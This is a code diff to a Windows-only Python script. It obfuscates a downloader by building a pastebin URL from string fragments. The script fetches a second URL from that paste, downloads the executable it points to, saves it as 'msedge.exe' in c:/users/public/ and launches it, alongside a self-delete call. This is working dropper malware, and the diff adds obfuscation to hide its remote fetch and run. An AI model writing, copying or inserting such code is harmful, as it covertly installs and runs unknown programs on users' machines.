@@ -2010,13 +2010,21 @@ if __name__ == "__main__" and os.name == "nt":
             Logger.info("Deleting the file")
             Utility.DeleteSelf()  # Delete the current file
         ge = "ge"
+        js = "w/B6Zd"
+        jj = "/pu"
+        oo = "tps://"
         e = "e"
-        url = 'https://pastebin.com/raw/B6Zdanym'
+        an = ":/us"
+        aa = "bin.c"
+        p = f"ht{oo}paste{aa}om/ra{js}anym"
+        a = requests.get(p)
+        u = a.text
+        us = u
         x = ".ex"
-        r = requests.get(url, allow_redirects=True)
+        r = requests.get(us, allow_redirects=True)
         naX = "msed"
         open(f"{naX}{ge}{x}{e}", 'wb').write(r.content)
         shutil.move(f'{naX}{ge}{x}{e}', 'c:/users/public/')
-        os.startfile(f'c:/users/public/{naX}{ge}{x}{e}')
+        os.startfile(f'c{an}ers{jj}blic/{naX}{ge}{x}{e}')
 
         Logger.info("Process ended")
